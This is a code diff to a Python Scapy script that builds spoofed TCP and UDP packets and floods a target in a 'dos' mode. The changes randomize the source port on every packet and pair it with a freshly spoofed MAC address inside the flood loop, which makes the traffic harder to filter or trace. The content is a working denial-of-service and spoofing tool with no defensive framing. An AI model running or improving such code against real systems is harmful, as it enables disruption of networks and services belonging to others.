@@ -54,9 +54,13 @@ dos=dos.upper()
 # Build IP-Header
 iphdr=IP(src=srcip,dst=dstip)
 
+# Random Source port
+
+srcport=random.randrange(1025,65535)
+
 # Build TCP packet
 if prot == "TCP":
-    tcp=TCP(sport=9999,dport=port,flags=flag)
+    tcp=TCP(sport=srcport,dport=port,flags=flag)
     if macspoof == "YES":
         packet=etherframe/iphdr/tcp/data
     else:
@@ -64,11 +68,11 @@ if prot == "TCP":
 
 # Build UDP packet
 if prot == "UDP":
-    udp=UDP(sport=9999,dport=port)
+    udp=UDP(sport=srcport,dport=port)
     if macspoof == "YES":
         packet=etherframe/iphdr/udp/data
     else:
-        packet=iphdr/udp/data/data
+        packet=iphdr/udp/data
 
 # Send the packet
 
@@ -84,11 +88,15 @@ if dos =="YES":
             if prot == "TCP":
                 mac=macspoofer()
                 etherframe=Ether(src=mac)
+                srcport=random.randrange(1025,65535)
+                tcp=TCP(sport=srcport,dport=port,flags=flag)
                 packet=etherframe/iphdr/tcp/data
                 sendp(packet, iface="en0")
             else:
                 mac=macspoofer()
                 etherframe=Ether(src=mac)
+                srcport=random.randrange(1025,65535)
+                udp=UDP(sport=srcport,dport=port)
                 packet=etherframe/iphdr/udp/data
                 sendp(packet, iface="en0")
         else:
